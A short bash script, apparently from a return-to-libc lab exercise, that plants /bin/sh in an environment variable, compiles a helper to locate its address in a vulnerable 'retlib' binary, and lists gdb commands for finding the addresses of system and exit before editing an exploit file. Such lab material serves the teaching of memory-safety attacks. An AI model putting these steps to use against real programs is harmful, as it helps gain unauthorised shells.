#!/bin/bash

export MYSHELL=/bin/sh
gcc -o getenv getenv.c 
./getenv MYSHELL ./retlib

gdb retlib
# Commands to be typed
# b main
# r
# p system
# p exit

#Update variables inside the exploit.c file